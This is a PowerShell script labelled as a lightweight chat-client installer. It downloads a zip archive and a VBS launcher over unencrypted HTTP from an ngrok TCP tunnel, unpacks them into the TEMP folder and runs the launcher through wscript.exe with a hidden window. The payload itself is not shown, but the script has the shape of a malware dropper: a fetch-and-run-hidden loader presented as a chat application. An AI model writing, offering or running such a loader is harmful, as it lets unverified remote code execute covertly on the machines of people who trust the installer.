# PowerShell Client Installer - Ultra lightweight
$SERVER = "2.tcp.ngrok.io:13434"
$TEMP = "$env:TEMP\ChatClient"

Write-Host "Chat Client Quick Installer" -ForegroundColor Cyan
Write-Host "==========================" -ForegroundColor Cyan
Write-Host "Server: $SERVER`n"

# Create directory
New-Item -ItemType Directory -Force -Path $TEMP | Out-Null

# Download compressed client
Write-Host "Downloading client (14MB)..." -ForegroundColor Yellow
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "http://$SERVER/download/client.zip" -OutFile "$TEMP\client.zip"
Write-Host "✓ Downloaded" -ForegroundColor Green

# Extract
Write-Host "Extracting..." -ForegroundColor Yellow
Expand-Archive -Path "$TEMP\client.zip" -DestinationPath $TEMP -Force
Remove-Item "$TEMP\client.zip"
Write-Host "✓ Extracted" -ForegroundColor Green

# Download launcher
Write-Host "Setting up launcher..." -ForegroundColor Yellow
Invoke-WebRequest -Uri "http://$SERVER/download/launcher.vbs" -OutFile "$TEMP\run-client.vbs"
Write-Host "✓ Ready" -ForegroundColor Green

# Start client
Write-Host "`n🚀 Starting client..." -ForegroundColor Cyan
Start-Process -FilePath "wscript.exe" -ArgumentList "$TEMP\run-client.vbs" -WindowStyle Hidden

Write-Host "`n✅ Installation complete!" -ForegroundColor Green
Write-Host "Client is running in background" -ForegroundColor Green
Write-Host "`nPress any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")